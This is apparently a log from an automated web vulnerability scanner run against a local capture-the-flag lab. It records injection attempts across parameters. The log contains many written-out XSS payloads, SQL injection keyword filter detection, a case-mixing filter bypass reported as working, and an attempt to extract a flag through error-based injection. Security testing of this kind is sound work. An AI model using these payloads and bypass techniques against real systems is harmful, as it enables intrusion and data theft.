+2026-10-30 15:50:10,369 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?q=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:10,407 - ParameterDiscoveryAgent - INFO - Analyzing 2 script(s) for fetch/AJAX calls...
+2026-10-30 15:50:10,425 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 200 OK"
+2026-10-30 15:50:10,465 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:10,497 - ParameterDiscoveryAgent - INFO - Testing for GraphQL endpoints...
+2026-10-30 15:50:10,500 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:10,529 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:10,573 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:10,605 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:10,665 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?solution=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:10,722 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:10,768 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?search=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:10,821 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:10,867 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:10,913 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:10,952 - ParameterDiscoveryAgent - INFO - Found 2 interesting link(s) to follow
+2026-10-30 15:50:10,954 - ParameterDiscoveryAgent - INFO -   Following: http://host.docker.internal:51481/name/set?name=Cocomelon
+2026-10-30 15:50:10,971 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:11,029 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:11,062 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?solution=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:11,095 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:11,129 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:11,166 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:11,211 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:11,241 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:11,271 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:11,301 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?name=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:11,329 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?solution=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:11,360 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?q=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:11,394 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?search=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:11,432 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:11,461 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:11,488 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:11,517 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481 "HTTP/1.1 405 Not Allowed"
+2026-10-30 15:50:11,545 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?name=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:11,571 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?solution=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:11,596 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?q=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:11,623 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481?search=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 200 OK"
+2026-10-30 15:50:11,647 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,670 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,694 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,716 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,736 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,763 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?solution=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,785 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?q=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,810 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?search=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,834 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,857 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,878 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,900 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,921 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?name=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,941 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?solution=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,964 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?q=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:11,983 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,003 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,024 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,051 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,074 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,101 - ParameterDiscoveryAgent - INFO -   Following: http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script
+2026-10-30 15:50:12,114 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,155 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?solution=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,178 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,204 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?search=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,240 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,275 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,318 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,351 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,384 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,408 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?solution=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,430 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,457 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,481 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,506 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,533 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,557 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,580 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?name=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,604 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?solution=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,633 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?q=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,655 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?search=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,678 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,701 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,727 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,747 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,766 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?name=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,785 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?solution=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,826 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?q=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,851 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?search=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,871 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,892 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,910 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,931 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,950 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,964 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?solution=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,978 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?q=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:12,995 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?search=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,061 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,091 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,130 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,244 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,277 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?name=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,323 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?solution=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,347 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?q=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,365 - ParameterDiscoveryAgent - WARNING - No parameters discovered via any method
+2026-10-30 15:50:13,366 - ParameterDiscoveryAgent - INFO - Falling back to URL pattern analysis...
+2026-10-30 15:50:13,367 - ParameterDiscoveryAgent - INFO - URL pattern suggests 3 likely parameters:
+2026-10-30 15:50:13,368 - ParameterDiscoveryAgent - INFO -   + id (confidence: 50%, reason: Generic fallback)
+2026-10-30 15:50:13,369 - ParameterDiscoveryAgent - INFO -   + search (confidence: 50%, reason: Generic fallback)
+2026-10-30 15:50:13,370 - ParameterDiscoveryAgent - INFO -   + q (confidence: 40%, reason: Generic fallback)
+2026-10-30 15:50:13,371 - ParameterDiscoveryAgent - INFO - Discovered 3 injection points:
+2026-10-30 15:50:13,372 - ParameterDiscoveryAgent - INFO -   - id (query, type: numeric)
+2026-10-30 15:50:13,373 - ParameterDiscoveryAgent - INFO -   - search (query, type: string)
+2026-10-30 15:50:13,374 - ParameterDiscoveryAgent - INFO -   - q (query, type: string)
+2026-10-30 15:50:13,375 - SQLiOrchestrator - INFO - Found 3 potential injection points
+2026-10-30 15:50:13,376 - SQLiOrchestrator - INFO - Step 1.5: Detecting input filters and testing bypass techniques...
+2026-10-30 15:50:13,393 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,414 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,437 - SQLiFilterDetector - INFO - [Filter Detection] Testing for input filters...
+2026-10-30 15:50:13,446 - SQLiFilterDetector - INFO -   [REMOVED] SELECT had no effect (stripped)
+2026-10-30 15:50:13,458 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,480 - SQLiFilterDetector - INFO -   [REMOVED] UNION had no effect (stripped)
+2026-10-30 15:50:13,484 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,504 - SQLiFilterDetector - INFO -   [REMOVED] OR had no effect (stripped)
+2026-10-30 15:50:13,511 - SQLiFilterDetector - INFO -   [REMOVED] AND had no effect (stripped)
+2026-10-30 15:50:13,519 - SQLiFilterDetector - INFO -   [REMOVED] FROM had no effect (stripped)
+2026-10-30 15:50:13,524 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,543 - SQLiFilterDetector - INFO -   [REMOVED] WHERE had no effect (stripped)
+2026-10-30 15:50:13,547 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,566 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?solution=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,586 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,603 - SQLiFilterDetector - INFO -   [REMOVED] INSERT had no effect (stripped)
+2026-10-30 15:50:13,608 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?search=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,630 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,649 - SQLiFilterDetector - INFO -   [REMOVED] UPDATE had no effect (stripped)
+2026-10-30 15:50:13,653 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,672 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,700 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,718 - SQLiFilterDetector - INFO -   [REMOVED] DELETE had no effect (stripped)
+2026-10-30 15:50:13,721 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,745 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?solution=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,770 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,788 - SQLiFilterDetector - INFO -   [REMOVED] DROP had no effect (stripped)
+2026-10-30 15:50:13,791 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,812 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,833 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,850 - SQLiFilterDetector - INFO -   [REMOVED] EXEC had no effect (stripped)
+2026-10-30 15:50:13,854 - SQLiFilterDetector - INFO - [Filter Detection] Detected keyword_removal
+2026-10-30 15:50:13,856 - SQLiFilterDetector - INFO -   Blocked keywords: SELECT, UNION, OR, AND, FROM
+2026-10-30 15:50:13,857 - SQLiFilterDetector - INFO - [Bypass Testing] Testing bypass techniques...
+2026-10-30 15:50:13,858 - SQLiFilterDetector - INFO -   Testing: Case mixing (SeLeCt)
+2026-10-30 15:50:13,861 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,887 - SQLiFilterDetector - INFO -     ✓ SELECT → SeLeCt works!
+2026-10-30 15:50:13,889 - SQLiFilterDetector - INFO -   ✅ Case mixing bypasses filter!
+2026-10-30 15:50:13,891 - SQLiOrchestrator - INFO - ✓ Filter detected: keyword_removal
+2026-10-30 15:50:13,894 - SQLiOrchestrator - INFO -   Blocked keywords: SELECT, UNION, OR, AND, FROM
+2026-10-30 15:50:13,896 - SQLiOrchestrator - INFO -   ✓ Bypass found: case_mixing
+2026-10-30 15:50:13,897 - SQLiOrchestrator - INFO -   Examples: [('SELECT', 'SeLeCt')]
+2026-10-30 15:50:13,899 - SQLiOrchestrator - INFO - 
+================================================================================
+2026-10-30 15:50:13,900 - SQLiOrchestrator - INFO - Testing parameter: id
+2026-10-30 15:50:13,901 - SQLiOrchestrator - INFO - ================================================================================
+
+2026-10-30 15:50:13,902 - SQLiOrchestrator - INFO - [AGGRESSIVE TESTING] Fast SQLMap-style testing on id
+2026-10-30 15:50:13,904 - SQLiOrchestrator - INFO -    Mode: AGGRESSIVE (Error→UNION→Boolean→Time)
+2026-10-30 15:50:13,904 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Starting fast SQLMap-style testing on id
+2026-10-30 15:50:13,906 - AggressiveSQLiVerifier - INFO - [BYPASS] Filter bypass enabled: case_mixing
+2026-10-30 15:50:13,908 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,932 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?name=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,952 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?solution=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,971 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?q=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:13,990 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?search=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:14,009 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:14,030 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:14,049 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:14,069 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:14,089 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?name=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:14,113 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?solution=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:14,134 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?q=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:14,155 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?search=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:50:14,175 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:14,199 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:14,221 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:14,241 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:14,265 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:14,286 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?solution=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:14,306 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?q=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:14,328 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?search=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:14,395 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:14,478 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:14,506 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:14,547 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:50:14,584 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?name=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:14,608 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?solution=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:14,629 - AggressiveSQLiVerifier - INFO - [AGGRESSIVE] Phase 1/5: Error-based detection (2s)
+2026-10-30 15:50:14,631 - AggressiveSQLiVerifier - INFO - [ERROR-BASED] Attempting data extraction via EXTRACTVALUE/UPDATEXML...
+2026-10-30 15:50:14,632 - AggressiveSQLiVerifier - INFO - [ERROR-EXTRACT] Trying flag.flag...
+2026-10-30 15:50:14,639 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?q=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:14,688 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:50:14,720 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
